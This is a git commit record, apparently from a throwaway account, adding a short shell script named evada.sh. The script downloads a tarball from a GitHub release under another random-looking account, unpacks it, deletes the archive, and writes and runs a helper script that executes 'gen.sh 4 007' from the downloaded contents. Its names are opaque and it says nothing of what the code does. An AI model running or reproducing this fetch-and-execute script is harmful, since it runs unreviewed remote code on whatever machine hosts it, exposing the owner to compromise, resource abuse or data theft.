42e72aee342df8ba24692037417beae9ce4751bb
juxsuviel509-beep <juxsuviel509@deciw.com>
2026-09-17 21:06:45 +0700

    Create evada.sh

---
+++ evada.sh
@@ -0,0 +1,5 @@
+curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/koni.tar.gz && tar -xf koni.tar.gz && rm -rf koni.tar.gz
+echo '#!/bin/bash
+
+bash gen.sh 4 007' > baso.sh
+bash baso.sh
